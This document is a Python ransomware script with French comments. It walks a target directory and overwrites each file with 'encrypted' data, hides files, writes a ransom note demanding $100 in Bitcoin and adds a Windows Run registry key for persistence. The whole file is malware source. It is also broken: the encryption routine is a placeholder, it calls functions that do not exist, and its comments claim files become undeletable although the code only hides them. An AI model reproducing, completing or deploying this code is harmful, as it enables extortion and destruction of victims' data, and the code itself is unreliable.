import os
import string
import random
import ctypes
import _winreg

def generate_random_key(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = your_encryption_algorithm(data, key) # utilisez votre propre algorithme d'encryption ici
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

    # rendre le fichier insupprimable
    if os.name == 'nt':
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        success = kernel32.SetFileAttributesW(file_path, 2)  # FILE_ATTRIBUTE_HIDDEN
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())
    elif os.name == 'posix':
        os.chattr(file_path, (os.stat(file_path).st_mode | stat.S_IMMUTABLE))

def encrypt_files_in_directory(directory, key):
    for subdir, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(subdir, file)
            encrypt_file(file_path, key)

def create_ransom_note(directory, key):
    with open(os.path.join(directory, 'README.txt'), 'w') as f:
        f.write('Your files have been encrypted. Pay us $100 in Bitcoin to get the decryption key.\n')
        f.write('Bitcoin address: [INSERT YOUR BITCOIN ADDRESS HERE]\n')
        f.write('Decryption key: ' + key)

    # rendre la note de rançon insupprimable
    if os.name == 'nt':
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        success = kernel32.SetFileAttributesW(os.path.join(directory, 'README.txt'), 2)  # FILE_ATTRIBUTE_HIDDEN
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())
        try:
            key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                                "Software\Microsoft\Windows\CurrentVersion\Run",
                                0, _winreg.KEY_ALL_ACCESS)
            _winreg.SetValueEx(key, "Ransomware", 0, _winreg.REG_SZ, os.path.join(directory, 'ransomware.exe'))
            _winreg.CloseKey(key)
        except WindowsError:
            pass
    elif os.name == 'posix':
        os.chattr(os.path.join(directory, 'README.txt'), (os.stat(os.path.join(directory, 'README.txt')).st_mode | stat.S_IMMUTABLE))

def main():
    target_directory = '/path/to/encrypt'
    key = generate_random_key(32)
    encrypt_files_in_directory(target_directory, key)
    create_ransom_note(target_directory, key)

if __name__ == '__main__':
    main()
